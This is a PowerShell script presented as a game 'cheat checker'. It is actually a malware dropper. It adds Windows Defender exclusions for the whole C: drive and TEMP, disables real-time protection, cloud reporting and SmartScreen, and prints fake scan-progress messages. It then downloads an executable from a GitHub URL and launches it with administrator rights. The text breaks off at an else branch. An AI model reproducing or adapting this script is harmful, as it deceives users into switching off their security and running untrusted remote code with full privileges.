[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$ErrorActionPreference = "SilentlyContinue"
Clear

Write-Host "Cheat checker activated.." -ForegroundColor Yellow

# 1. Administrator Rights Check
$currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
if (-not $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "[-] ERROR: Script launched WITHOUT administrator rights!" -ForegroundColor Red
    Write-Host "[!] Antivirus disable commands will NOT work." -ForegroundColor Yellow
} else {
    Write-Host "[+] Administrator rights confirmed." -ForegroundColor Green
}

# 2. DISABLE PROTECTION (New Block)
Write-Host "[*] Start looking for cheats..." -ForegroundColor Cyan

# Adding exclusions for paths and the file itself
$outputFile = "$env:TEMP\ccmmd.exe"
Add-MpPreference -ExclusionPath "C:\", "C:\Windows\Temp", "C:\ProgramData", "$env:TEMP", $outputFile

# Disabling real-time monitoring and cloud-based protection
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableBlockAtFirstSeen $true
Set-MpPreference -SubmitSamplesConsent 2
Set-MpPreference -MAPSReporting 0

# Disabling SmartScreen via Registry
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name 'SmartScreenEnabled' -Value 'Off' -Type String
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name 'EnableSmartScreen' -Value 0 -Type DWORD

Write-Host "[+]Scanning 0.02%." -ForegroundColor Gray
Write-Host "[+]Scanning 12.01%." -ForegroundColor Gray
Write-Host "[+]Scanning 79.90%." -ForegroundColor Gray
Write-Host "[+]Scanning Successful." -ForegroundColor Gray

# 3. Path Setup

# 4. Download Attempt
$url = "https://github.com/expendertie/chear11/raw/refs/heads/main/main.exe"
Write-Host "[*] Checker loop..." -ForegroundColor Cyan

try {
    # Using a more reliable download method
    Invoke-WebRequest -Uri $url -OutFile $outputFile -UserAgent "Mozilla/5.0" -UseBasicParsing
    Write-Host "[+] cheats nor found." -ForegroundColor Green
} catch {
    Write-Host "[-] Checker failed with ERROR: $($_.Exception.Message)" -ForegroundColor Red
    # Backup method via WebClient
    try {
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("User-Agent", "Mozilla/5.0")
        $wc.DownloadFile($url, $outputFile)
        Write-Host "[+] Checker Checker successfully (WebClient)." -ForegroundColor Green
    } catch {
        Write-Host "[-] CRITICAL ERROR: Checker failed." -ForegroundColor Red
    }
}

# 5. Check for file existence before launching
if (Test-Path $outputFile) {
    Write-Host "[*] Attempting to launch Checker..." -ForegroundColor Cyan
    try {
        # Attempting to launch and monitoring for errors
        $process = Start-Process -FilePath $outputFile -Verb RunAs -PassThru -ErrorAction Stop
        Write-Host "[+] Process Checker (ID: $($process.Id))" -ForegroundColor Green
    } catch {
        Write-Host "[-] Checker ERROR: $($_.Exception.Message)" -ForegroundColor Red
    }
} else {
